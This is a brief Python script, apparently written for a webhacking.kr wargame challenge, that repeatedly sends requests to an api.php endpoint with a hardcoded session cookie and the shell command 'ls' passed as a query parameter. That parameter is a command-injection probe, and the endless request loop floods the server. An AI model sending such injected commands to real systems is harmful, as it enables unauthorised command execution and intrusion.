import requests


URL = "http://webhacking.kr:10020/api.php"
SESSION_ID = "42k3odbmn13sus7k9ad4nestaq"
cookies = {'PHPSESSID':SESSION_ID}

params ={'q':'ls'}
while True:
    response = requests.get(URL, params=params, cookies=cookies)
    print(response.text)

